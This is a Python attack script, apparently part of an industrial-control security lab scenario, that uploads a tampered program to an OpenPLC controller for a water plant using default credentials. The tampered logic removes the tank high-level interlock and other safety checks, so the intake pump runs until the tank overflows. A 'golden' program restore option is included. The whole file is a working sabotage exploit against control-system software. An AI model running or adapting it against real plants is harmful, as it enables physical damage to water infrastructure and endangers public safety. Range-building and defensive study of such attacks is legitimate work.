#!/usr/bin/env python3
"""Scenario 9, replace the running control program on plc-water.

The OpenPLC runtime UI accepts a program upload while the keyswitch is in
REMOTE. This pushes a control(io) module that drops the high-level interlock,
so the intake pump stays on and the raw tank overflows.

  push_logic_water.py            upload the attacker program
  push_logic_water.py restore    upload the golden program back
"""
import sys
import urllib.request

import targets as T

URL = f"http://{T.guard(T.PLC_WATER)}:{T.HTTP_PORT}/upload-program"
AUTH = "Basic " + __import__("base64").b64encode(b"openplc:openplc").decode()

ATTACKER = b"""PROGRAM_NAME = "crosscreek_water_v1_PATCHED"
def control(io):
    # intake: chase the level setpoint but WITHOUT the 98% interlock
    if io.raw_level_pct <= io.level_low_sp:
        io.intake_pump = True
    elif io.raw_level_pct >= io.level_high_sp:
        io.intake_pump = False
    io.dose_enable = io.flow_gpm > 1.0
    if io.dist_press_psi < io.dist_press_target - 3:
        io.dist_pump = True
    elif io.dist_press_psi > io.dist_press_target + 3:
        io.dist_pump = False
"""

GOLDEN = b"""PROGRAM_NAME = "crosscreek_water_v1 (golden)"
def control(io):
    if not io.intake_hand:
        if io.raw_level_pct <= io.level_low_sp:
            io.intake_pump = True
        elif io.raw_level_pct >= io.level_high_sp:
            io.intake_pump = False
    if io.raw_level_pct >= 98.0 and not io.bypass_interlock:
        io.intake_pump = False
    if not io.dose_hand:
        io.dose_enable = io.flow_gpm > 1.0
    if io.chlorine_ppm >= io.safe_max_ppm:
        io.dose_enable = False
    if not io.dist_hand:
        if io.dist_press_psi < io.dist_press_target - 3:
            io.dist_pump = True
        elif io.dist_press_psi > io.dist_press_target + 3:
            io.dist_pump = False
    if io.treated_level_pct < 10.0:
        io.dist_pump = False
"""

# Prefer `./reset.sh` for a full restore; this is the quick in-place version.


def upload(blob, label):
    boundary = "----ccx"
    body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"program\"; "
        f"filename=\"{label}.py\"\r\nContent-Type: text/x-python\r\n\r\n"
    ).encode() + blob + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(URL, data=body, headers={
        "Authorization": AUTH,
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    })
    with urllib.request.urlopen(req, timeout=5) as r:
        print(r.read().decode("utf-8", "replace"))


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "restore":
        upload(GOLDEN, "golden")
    else:
        upload(ATTACKER, "patched")
        print("watch LT-101 climb to 100% on the water HMI.")
